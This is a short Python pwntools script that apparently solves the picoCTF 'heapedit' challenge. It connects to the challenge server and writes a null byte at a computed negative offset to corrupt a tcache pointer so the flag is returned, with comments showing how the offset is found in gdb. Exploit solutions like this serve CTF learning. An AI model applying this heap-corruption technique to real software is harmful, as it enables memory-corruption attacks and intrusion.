#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "CRITICAL"
context.terminal = ["konsole", "-e"]

LOCAL = "./heapedit_patched"
REMOTE = ("mercury.picoctf.net", 34499)


class Exploit:
    def __init__(self, local=False, debug=False):
        if local:
            self.process = "process()"
        else:
            self.process = "remote(REMOTE[0], REMOTE[1])"
        self.debug = debug

    def conn(self, proc: process):
        if self.debug:
            script = "heap chunks\n"
            script += "heap bins tcache\n"
            '''
            todo:
                1. get chucks address of flag in heap+1
                2. get chucks address of heap tcachebins
                3. search address that pointer tchachebins (e.g. search-pattern \\x90\\x68\\x59\\x01)
                3. heap_address of flag+1 - heap address of pointer tcachebin
                4. example: p/d 0x1417088 - 0x14184a0 = -5144
            '''
            gdb.attach(proc, gdbscript=script)
        proc.recvuntil(b"Address: ")
        proc.sendline(b"-5144")
        proc.recvuntil(b"Value: ")
        proc.sendline(b"\x00")
        proc.interactive()

    def start(self):
        '''start the exploit'''
        with eval(self.process) as r:
            self.conn(r)


Exploit(local=False, debug=False).start()
